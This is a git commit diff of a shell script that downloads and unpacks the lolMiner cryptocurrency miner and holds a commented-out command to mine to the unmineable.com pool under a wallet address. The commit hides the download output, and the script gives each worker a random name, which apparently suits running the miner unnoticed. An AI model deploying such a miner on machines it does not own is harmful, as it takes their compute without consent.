ffdc7025a07f4cf3fa8d755c04a68cdc1af47141
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-06-23 05:01:20 -0600

    Update unm.sh

--- unm.sh
+++ unm.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
-tar xf lolMiner_v1.29_Lin64.tar.gz
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz > /dev/null 2>&1
+tar xf lolMiner_v1.29_Lin64.tar.gz > /dev/null 2>&1
 cd 1.29
 #/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user VET:0x079885cbd1569bf0db5af3b8eb6818d963e2309f.Bouorn --ethstratum ETHPROXY
 
